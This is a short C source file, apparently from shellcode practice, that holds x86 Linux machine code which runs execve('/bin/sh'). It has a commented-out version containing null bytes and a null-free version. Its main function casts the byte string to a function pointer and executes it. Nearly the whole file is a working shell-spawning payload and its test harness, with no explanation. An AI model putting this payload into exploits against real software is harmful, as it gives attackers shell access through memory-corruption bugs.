/* 
 // with zeros 
 char shellcode[] = 
 "\xeb\x1e\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xdd\xff\xff\xff/bin/sh         ";	 
*/


 // without zeros 
 char shellcode[] = 
 "\xeb\x18\x5e\x31\xc0\x89\x76\x08\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh         ";

 void main(void){
	void (*funptr)(void);
	
	funptr = shellcode;

	(*funptr)();
 }
